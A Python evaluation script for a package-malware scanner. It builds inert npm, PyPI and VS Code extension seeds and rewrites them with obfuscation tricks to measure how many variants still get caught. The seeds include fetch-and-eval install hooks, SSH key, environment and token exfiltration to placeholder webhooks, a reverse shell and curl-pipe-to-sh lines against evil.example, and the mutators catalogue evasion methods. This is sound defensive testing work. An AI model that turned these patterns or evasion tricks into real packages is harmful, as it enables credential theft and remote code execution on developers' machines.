#!/usr/bin/env python3
"""Evasion-resistance eval for KalaScan.

Each seed is a tiny INERT package with the shape a rule looks for (an install
hook, a fetch piped to an interpreter, a reverse-shell socket, a webhook) but
pointing only at reserved names (`evil.example`, dummy tokens). Nothing here
is executed: the scanner only reads files. Every seed scores >= THRESHOLD
unmutated, or it is not a seed.

Each mutator rewrites a seed the way package malware is rewritten in public
write-ups (DataDog, Phylum, Checkmarx, Socket): split API names, hex/base64
layers, a payload in a `.txt` the manifest runs, code under a `.git/` dir of
an archive, a `.pth` file. The run reports, per category, how many variants
are still caught at THRESHOLD with a 95% Wilson interval, and lists the
evading (seed, mutator) pairs.

  cargo build                     # CARGO_TARGET_DIR per eval/README.md
  python3 eval/evasion.py --kalascan target/debug/kalascan
  python3 eval/evasion.py --out variants.json
  python3 eval/evasion.py --baseline eval/evasion-baseline.json   # gate a change

--baseline FILE exits 1 if any pair caught in the baseline is no longer
caught, so a rule change cannot silently lose robustness.
"""

import argparse
import collections
import json
import math
import os
import re
import subprocess
import sys
import tempfile
import zipfile

# --- Seeds: inert fixtures, one per thing KalaScan detects -----------------
# Reserved host `evil.example`, webhook.site with an all-zero id, placeholder
# tokens. `payload` names the code file the string/comment mutators rewrite.

SEEDS = [
    {
        "name": "npm-install-dl-exec", "eco": "npm", "payload": "install.js",
        "files": {
            "package.json": '{\n "name": "inert-dl-exec", "version": "1.0.0",\n'
                            ' "main": "index.js",\n'
                            ' "scripts": { "postinstall": "node install.js" }\n}\n',
            "index.js": "module.exports = {};\n",
            "install.js":
                "const https = require('https');\n"
                "fetch('https://evil.example/stage.js')"
                ".then(r => r.text()).then(code => eval(code));\n",
        },
    },
    {
        "name": "npm-cred-exfil", "eco": "npm", "payload": "steal.js",
        "files": {
            "package.json": '{ "name": "inert-cred", "version": "1.0.0", "main": "steal.js" }\n',
            "steal.js":
                "const fs = require('fs'), os = require('os'), path = require('path');\n"
                "const key = fs.readFileSync(path.join(os.homedir(), '.ssh', 'id_rsa'), 'utf8');\n"
                "const body = JSON.stringify({ key: key, env: process.env });\n"
                "fetch('https://webhook.site/00000000-0000-0000-0000-000000000000',"
                " { method: 'POST', body: body });\n",
        },
    },
    {
        "name": "npm-reverse-shell", "eco": "npm", "payload": "shell.js",
        "files": {
            "package.json": '{ "name": "inert-shell", "version": "1.0.0", "main": "shell.js" }\n',
            "shell.js":
                "const net = require('net'), cp = require('child_process');\n"
                "// shape only: /bin/sh -i >& /dev/tcp/evil.example/4444\n"
                "const c = new net.Socket();\n"
                "c.connect(4444, 'evil.example', () => {\n"
                "  const sh = cp.spawn('/bin/sh', []);\n"
                "  c.pipe(sh.stdin); sh.stdout.pipe(c); sh.stderr.pipe(c);\n"
                "});\n",
        },
    },
    {
        "name": "npm-dep-confusion", "eco": "npm", "payload": "hook.sh",
        "files": {
            # 99.99.99 outranks any private package of the same name; the hook
            # phones home with the host and user name at install.
            "package.json": '{\n "name": "inert-internal-lib", "version": "99.99.99",\n'
                            ' "scripts": { "preinstall": "curl https://evil.example/p?h=$(hostname)&u=$(whoami)" }\n}\n',
            "hook.sh": "#!/bin/sh\ncurl -s https://evil.example/collect?u=$(whoami)\n",
        },
    },
    {
        "name": "pypi-import-loader", "eco": "pypi", "payload": "loader.py",
        "files": {
            "setup.py": "from setuptools import setup\nsetup(name='inert-loader', version='1.0.0')\n",
            "loader.py":
                "import base64\n"
                "blob = 'aW5lcnQ='  # inert placeholder, never a real payload\n"
                "exec(__import__('zlib').decompress(__import__('base64').b64decode(blob)))\n",
        },
    },
    {
        "name": "pypi-setup-hook", "eco": "pypi", "payload": "setup.py",
        "files": {
            "setup.py":
                "import os, subprocess\n"
                "from setuptools import setup\n"
                "from setuptools.command.install import install\n"
                "class Run(install):\n"
                "    def run(self):\n"
                "        who = subprocess.check_output(['whoami'])\n"
                "        os.system('echo ' + os.uname().nodename)\n"
                "        install.run(self)\n"
                "setup(name='inert-hook', version='1.0.0', cmdclass={'install': Run})\n",
        },
    },
    {
        "name": "pypi-cred-exfil", "eco": "pypi", "payload": "grab.py",
        "files": {
            "setup.py": "from setuptools import setup\nsetup(name='inert-grab', version='1.0.0')\n",
            "grab.py":
                "import os, requests\n"
                "data = open(os.path.expanduser('~/.ssh/id_rsa')).read()\n"
                "requests.post('https://webhook.site/00000000-0000-0000-0000-000000000000',"
                " data={'k': data})\n",
        },
    },
    {
        "name": "pypi-download-cradle", "eco": "pypi", "payload": "setup.py",
        "files": {
            # fetch piped to an interpreter, run from the install hook.
            "setup.py":
                "import os\n"
                "from setuptools import setup\n"
                "os.system('curl -sSL https://evil.example/x.sh | sh')\n"
                "setup(name='inert-cradle', version='1.0.0')\n",
        },
    },
    {
        "name": "vscode-token-steal", "eco": "extension", "payload": "extension.js",
        "files": {
            "package.json": '{\n "name": "inert-ext", "publisher": "nobody", "version": "1.0.0",\n'
                            ' "engines": { "vscode": "^1.80.0" }, "main": "extension.js"\n}\n',
            "extension.js":
                "const vscode = require('vscode');\n"
                "async function activate() {\n"
                "  const s = await vscode.authentication.getSession('github', ['repo']);\n"
                "  fetch('https://webhook.site/00000000-0000-0000-0000-000000000000',"
                " { method: 'POST', body: s.accessToken });\n"
                "}\n"
                "module.exports = { activate };\n",
        },
    },
    {
        "name": "npm-discord-stealer", "eco": "npm", "payload": "grab.js",
        "files": {
            "package.json": '{ "name": "inert-discord", "version": "1.0.0", "main": "grab.js" }\n',
            "grab.js":
                "const fs = require('fs');\n"
                "const token = fs.readFileSync(process.env.APPDATA + "
                "'/Discord/Local Storage/leveldb', 'utf8');\n"
                "const password = token;\n"
                "fetch('https://discord.com/api/webhooks/"
                "123456789012345678/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA',"
                " { method: 'POST', body: JSON.stringify({ token, password }) });\n",
        },
    },
]

# Tokens the rules key on, present in the payloads. The string/indirection
# mutators rewrite these textually, the way obfuscated malware hides them.
# shortcut: textual rewrites; variants are never executed, only re-scanned.
API_TOKENS = [
    "child_process", "subprocess", "requests", "getSession", "readFileSync",
    "b64decode", "urlopen", "require", "fetch", "eval", "exec", "axios",
    "os.system", "spawn", "hostname", "whoami", "webhook", "discord",
]


def write_files(root, files):
    for rel, content in files.items():
        path = os.path.join(root, rel)
        os.makedirs(os.path.dirname(path) or root, exist_ok=True)
        with open(path, "w") as fh:
            fh.write(content)


# --- Mutators: each returns (files, archive) or None to skip a seed --------
# `archive` zips the files so the scanner unpacks them as a package (its
# `.git` is then the author's, not git metadata).

def _is_js(name):
    return name.endswith((".js", ".mjs", ".cjs", ".ts"))


def _copy(files):
    return dict(files)


def _rewrite_payload(seed, fn):
    """Apply `fn` to the seed's payload file; skip if it changes nothing."""
    files = _copy(seed["files"])
    before = files[seed["payload"]]
    after = fn(before, _is_js(seed["payload"]))
    if after == before:
        return None
    files[seed["payload"]] = after
    return files, False


# -- file placement and naming --
def mut_main_as_doc(seed):
    """Payload in a .txt the manifest's `main`/require points at: node and
    pip run it anyway."""
    files = _copy(seed["files"])
    pay = seed["payload"]
    if not _is_js(pay) or pay == "index.js":
        return None
    doc = pay.rsplit(".", 1)[0] + ".txt"
    files[doc] = files.pop(pay)
    files["package.json"] = '{ "name": "inert", "version": "1.0.0", "main": "./%s" }\n' % doc
    # a loader so a require-chain also reaches it
    files["load.js"] = "require('./%s');\n" % doc
    return files, False


def mut_no_extension(seed):
    """Payload in an extensionless `#!` script that a bin entry runs."""
    pay = seed["payload"]
    if not _is_js(pay):
        return None
    files = _copy(seed["files"])
    files["runme"] = "#!/usr/bin/env node\n" + files.pop(pay)
    files["package.json"] = '{ "name": "inert", "version": "1.0.0", "bin": { "x": "./runme" } }\n'
    return files, False


def mut_git_dir(seed):
    """Code under a top-level `.git/` directory of an archive."""
    files = {}
    for rel, content in seed["files"].items():
        files[rel if rel.endswith(".json") else ".git/" + rel] = content
    return files, True


def mut_pth_file(seed):
    """A .pth file: Python runs each `import`-prefixed line at startup."""
    if seed["eco"] != "pypi":
        return None
    files = _copy(seed["files"])
    body = files[seed["payload"]].replace("\n", "; ").strip("; ")
    files["inert.pth"] = "import os; exec('''" + body.replace("'", "\\'") + "''')\n"
    return files, False


# -- comment and whitespace tricks --
def mut_hash_prefix_js(seed):
    """A `#`-prefixed line in JS: a private class member, executed code."""
    if not _is_js(seed["payload"]):
        return None
    return _rewrite_payload(seed, lambda t, js: "\n".join(
        "#" + ln if ("fetch" in ln or "spawn" in ln or "readFileSync" in ln) else ln
        for ln in t.splitlines()) + "\n")


def mut_block_comment_earlier(seed):
    """A `/*` earlier on the payload line (inside a string)."""
    return _rewrite_payload(seed, lambda t, js: t.replace(
        "fetch(", 'x = "/*"; fetch(' if js else "fetch(", 1))


def mut_thousand_spaces(seed):
    return _rewrite_payload(seed, lambda t, js: "\n".join(
        (" " * 1000 + ln if any(k in ln for k in ("fetch", "exec", "curl", "requests")) else ln)
        for ln in t.splitlines()) + "\n")


def mut_line_continuation(seed):
    if seed["payload"].endswith(".sh"):
        return _rewrite_payload(seed, lambda t, js: t.replace("curl ", "cur\\\nl ", 1))
    return None


# -- string construction --
def _split_tokens(text):
    for tok in API_TOKENS:
        if tok in text and "." not in tok:
            mid = len(tok) // 2
            text = text.replace(tok, "%s'+'%s" % (tok[:mid], tok[mid:]))
    return text


def mut_split_concat(seed):
    return _rewrite_payload(seed, lambda t, js: _split_tokens(t))


def mut_hex_escape(seed):
    def fn(t, js):
        for tok in ("fetch", "require", "eval", "exec"):
            if tok in t:
                esc = "".join("\\x%02x" % b for b in tok.encode())
                t = t.replace(tok, esc, 1)
        return t
    return _rewrite_payload(seed, fn)


def mut_charcodes(seed):
    def fn(t, js):
        for tok in ("fetch", "require", "exec", "child_process"):
            if tok in t:
                arr = ",".join(str(b) for b in tok.encode())
                repl = ("String.fromCharCode(%s)" % arr) if js else ("bytes([%s]).decode()" % arr)
                return t.replace(tok, repl, 1)
        return t
    return _rewrite_payload(seed, fn)


def mut_base64_layer(seed):
    """Wrap the payload in a base64 blob that is decoded and run."""
    import base64
    pay = seed["payload"]
    files = _copy(seed["files"])
    blob = base64.b64encode(files[pay].encode()).decode()
    if _is_js(pay):
        files[pay] = "eval(Buffer.from('%s', 'base64').toString());\n" % blob
    elif pay.endswith(".py"):
        files[pay] = "import base64\nexec(base64.b64decode('%s'))\n" % blob
    else:
        return None
    return files, False


def mut_reversed_strings(seed):
    def fn(t, js):
        if not js or "fetch" not in t:
            return t
        return t.replace("fetch(", "window['hctef'.split('').reverse().join('')](", 1)
    return _rewrite_payload(seed, fn)


def mut_atob_layer(seed):
    """A base64 layer decoded with `atob` instead of Buffer (browser-style loaders)."""
    import base64
    pay = seed["payload"]
    if not _is_js(pay):
        return None
    files = _copy(seed["files"])
    files[pay] = "eval(atob('%s'));\n" % base64.b64encode(files[pay].encode()).decode()
    return files, False


def mut_template_literal(seed):
    """A quoted name rewritten as a template literal with an empty interpolation."""
    def sub(m):
        body = m.group(1)
        for tok in ("child_process", "webhook", "evil.example", "discord", "id_rsa"):
            if tok in body:
                return "`" + body.replace(tok, tok[:3] + "${''}" + tok[3:], 1) + "`"
        return m.group(0)
    return _rewrite_payload(seed, lambda t, js: re.sub(r"'([^'\n]*)'", sub, t) if js else t)


def mut_unicode_escape(seed):
    """`\\u0066etch(`: a unicode escape inside a JS identifier."""
    def fn(t, js):
        if not js:
            return t
        for tok in ("fetch(", "eval(", "require("):
            t = t.replace(tok, "\\u%04x%s" % (ord(tok[0]), tok[1:]), 1)
        return t
    return _rewrite_payload(seed, fn)


# -- indirection --
def mut_bracket_member(seed):
    """`cp['spa'+'wn'](`: a member call through a computed property."""
    def fn(t, js):
        if not js:
            return t
        for name in ("spawn", "readFileSync", "connect", "getSession"):
            mid = len(name) // 2
            t = t.replace(".%s(" % name, "['%s'+'%s'](" % (name[:mid], name[mid:]))
        return t
    return _rewrite_payload(seed, fn)


def mut_dynamic_import(seed):
    """`await import('x')` in place of `require('x')`."""
    def fn(t, js):
        if not js or "require(" not in t:
            return t
        return "(async () => {\n" + t.replace("require(", "await import(") + "})();\n"
    return _rewrite_payload(seed, fn)


def mut_importlib(seed):
    """`importlib.import_module('subprocess')` instead of an import statement."""
    def sub(m):
        mods = [x.strip() for x in m.group(1).split(",")]
        return "import importlib\n" + "\n".join("%s = importlib.import_module('%s')" % (x, x) for x in mods)
    return _rewrite_payload(seed, lambda t, js: t if js else re.sub(r"(?m)^import ([\w, ]+)$", sub, t, count=1))


def mut_compile_exec(seed):
    """Python code run through `exec(compile(src, '<x>', 'exec'))`."""
    pay = seed["payload"]
    if not pay.endswith(".py") or pay == "setup.py":
        return None
    files = _copy(seed["files"])
    files[pay] = "src = %r\nexec(compile(src, '<string>', 'exec'))\n" % files[pay]
    return files, False


def mut_node_e_hook(seed):
    """The install hook as `node -e "require('./x')"` instead of `node x`."""
    pkg = seed["files"].get("package.json", "")
    if "node install.js" not in pkg:
        return None
    files = _copy(seed["files"])
    files["package.json"] = pkg.replace("node install.js", "node -e \\\"require('./install.js')\\\"")
    return files, False


def mut_alias_require(seed):
    def fn(t, js):
        if not js or "require(" not in t:
            return t
        return "const r = require;\n" + t.replace("require(", "r(")
    return _rewrite_payload(seed, fn)


def mut_globalthis(seed):
    def fn(t, js):
        if not js or "process.env" not in t:
            return t
        return t.replace("process.env", "globalThis['pro'+'cess'].env")
    return _rewrite_payload(seed, fn)


def mut_getattr_import(seed):
    def fn(t, js):
        if js or "os.system" not in t:
            return t
        return t.replace("os.system", "getattr(__import__('os'), 'sy'+'stem')")
    return _rewrite_payload(seed, fn)


def mut_second_file(seed):
    """Payload moved to a second module the entry imports."""
    pay = seed["payload"]
    files = _copy(seed["files"])
    if _is_js(pay):
        files["vendor/helper.js"] = files.pop(pay)
        files[pay] = "require('./vendor/helper.js');\n"
    elif pay.endswith(".py") and pay != "setup.py":
        files["_impl.py"] = files.pop(pay)
        files[pay] = "import _impl\n"
    else:
        return None
    return files, False


# -- packaging --
def mut_node_modules(seed):
    """Payload hidden inside a bundled dependency directory."""
    files = {}
    for rel, content in seed["files"].items():
        files[rel if rel.endswith(".json") else "node_modules/dep/" + rel] = content
    return files, False


def mut_minify(seed):
    return _rewrite_payload(seed, lambda t, js: " ".join(t.split()) + "\n")


def mut_pad_dataflow(seed):
    """Pad past the 64 KB data-flow limit with a long comment."""
    pad = ("# " if seed["payload"].endswith(".py") else "// ") + "x" * 70000 + "\n"
    return _rewrite_payload(seed, lambda t, js: pad + t)


MUTATORS = [
    ("file-placement", "main-as-doc", mut_main_as_doc),
    ("file-placement", "no-extension", mut_no_extension),
    ("file-placement", "git-dir-archive", mut_git_dir),
    ("file-placement", "pth-file", mut_pth_file),
    ("comment-whitespace", "hash-prefixed-js", mut_hash_prefix_js),
    ("comment-whitespace", "block-comment-earlier", mut_block_comment_earlier),
    ("comment-whitespace", "thousand-spaces", mut_thousand_spaces),
    ("comment-whitespace", "line-continuation", mut_line_continuation),
    ("string-construction", "split-concat", mut_split_concat),
    ("string-construction", "hex-escape", mut_hex_escape),
    ("string-construction", "char-codes", mut_charcodes),
    ("string-construction", "base64-layer", mut_base64_layer),
    ("string-construction", "reversed-strings", mut_reversed_strings),
    ("string-construction", "atob-layer", mut_atob_layer),
    ("string-construction", "template-literal", mut_template_literal),
    ("string-construction", "unicode-escape", mut_unicode_escape),
    ("indirection", "bracket-member", mut_bracket_member),
    ("indirection", "dynamic-import", mut_dynamic_import),
    ("indirection", "importlib", mut_importlib),
    ("indirection", "compile-exec", mut_compile_exec),
    ("file-placement", "node-e-hook", mut_node_e_hook),
    ("indirection", "alias-require", mut_alias_require),
    ("indirection", "globalthis", mut_globalthis),
    ("indirection", "getattr-import", mut_getattr_import),
    ("indirection", "second-file", mut_second_file),
    ("packaging", "node-modules-dir", mut_node_modules),
    ("packaging", "minify-one-line", mut_minify),
    ("packaging", "pad-past-dataflow", mut_pad_dataflow),
]


# --- scanning --------------------------------------------------------------
def scan(args, target):
    with tempfile.TemporaryDirectory(prefix="kalascan-evasion-") as tmp:
        out = os.path.join(tmp, "result.json")
        cmd = [args.kalascan, "scan", target, "--untrusted", "--format", "json", "--output", out]
        try:
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=args.timeout)
        except subprocess.TimeoutExpired:
            return None
        if not os.path.exists(out):
            sys.stderr.write((proc.stderr.strip().splitlines() or ["no output"])[-1][:200] + "\n")
            return None
        return json.load(open(out))["risk_score"]


def build_and_scan(args, seed, built):
    """Write the variant to a temp dir (zip it when the mutator asks) and
    scan. Returns the risk score, or None on skip/error."""
    files, archive = built
    with tempfile.TemporaryDirectory(prefix="kalascan-seed-") as tmp:
        src = os.path.join(tmp, seed["name"])
        write_files(src, files)
        if archive:
            zip_path = os.path.join(tmp, seed["name"] + ".zip")
            with zipfile.ZipFile(zip_path, "w") as z:
                for root, _, names in os.walk(src):
                    for n in names:
                        full = os.path.join(root, n)
                        z.write(full, os.path.relpath(full, src))
            return scan(args, zip_path)
        return scan(args, src)


def wilson(num, den, z=1.96):
    """95% Wilson interval: honest at 0/n and n/n."""
    if not den:
        return 0.0, 1.0
    p = num / den
    mid = (p + z * z / (2 * den)) / (1 + z * z / den)
    half = z * math.sqrt(p * (1 - p) / den + z * z / (4 * den * den)) / (1 + z * z / den)
    return max(0.0, mid - half), min(1.0, mid + half)


def rate(num, den):
    if not den:
        return "-"
    lo, hi = wilson(num, den)
    return f"{num}/{den} ({100 * num / den:.0f}%, {100 * lo:.0f}-{100 * hi:.0f})"


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--kalascan", default="target/release/kalascan")
    ap.add_argument("--threshold", type=int, default=50, help="risk >= T counts as caught")
    ap.add_argument("--timeout", type=int, default=120)
    ap.add_argument("--out", help="write per-variant results JSON")
    ap.add_argument("--baseline", help="fail (exit 1) if a pair caught here is now missed")
    args = ap.parse_args()

    # Baseline, so every seed really is a seed.
    print("== seeds (unmutated, must score >= %d)" % args.threshold)
    results = []
    for seed in SEEDS:
        risk = build_and_scan(args, seed, (seed["files"], False))
        ok = risk is not None and risk >= args.threshold
        print(f"  {'OK ' if ok else 'LOW'} {str(risk):>4} {seed['name']} ({seed['eco']})")
        if not ok:
            sys.exit(f"seed {seed['name']} scored {risk} < {args.threshold}; not a seed")

    # Every seed x applicable mutator.
    by_cat = collections.defaultdict(lambda: [0, 0])  # [caught, total]
    evading = []
    total = len(SEEDS) * len(MUTATORS)
    done = 0
    for seed in SEEDS:
        for category, mname, fn in MUTATORS:
            done += 1
            built = fn(seed)
            if built is None:
                continue  # mutator does not apply to this seed
            risk = build_and_scan(args, seed, built)
            caught = risk is not None and risk >= args.threshold
            by_cat[category][0] += int(caught)
            by_cat[category][1] += 1
            results.append({"seed": seed["name"], "eco": seed["eco"], "category": category,
                            "mutator": mname, "risk": risk, "caught": caught})
            if not caught:
                evading.append((seed["name"], mname, risk))
            sys.stderr.write(f"[{done}/{total}] {seed['name']:24} {mname:22} "
                             f"{str(risk):>4} {'caught' if caught else 'EVADES'}\n")

    print(f"\n== caught by mutation category at T={args.threshold}")
    print(f"  {'category':22} {'caught / variants':<30}")
    for cat in sorted(by_cat):
        c, n = by_cat[cat]
        print(f"  {cat:22} {rate(c, n):<30}")
    tc = sum(c for c, _ in by_cat.values())
    tn = sum(n for _, n in by_cat.values())
    print(f"  {'ALL':22} {rate(tc, tn):<30}")

    print(f"\n== evading (seed, mutator) pairs [{len(evading)}]")
    for name, mname, risk in evading:
        print(f"  {str(risk):>4}  {name:24} {mname}")

    if args.out:
        json.dump(results, open(args.out, "w"), indent=1)
        print(f"\nwrote {args.out}")

    if args.baseline:
        if not os.path.exists(args.baseline):
            json.dump(results, open(args.baseline, "w"), indent=1)
            print(f"wrote baseline {args.baseline}")
            return
        base = json.load(open(args.baseline))
        now = {(r["seed"], r["mutator"]): r["caught"] for r in results}
        lost = [(r["seed"], r["mutator"]) for r in base
                if r["caught"] and not now.get((r["seed"], r["mutator"]), False)]
        if lost:
            print(f"\n== REGRESSION: {len(lost)} pair(s) caught in baseline now missed")
            for name, mname in lost:
                print(f"  {name:24} {mname}")
            sys.exit(1)
        print(f"\nno robustness regression vs {args.baseline}")


if __name__ == "__main__":
    main()
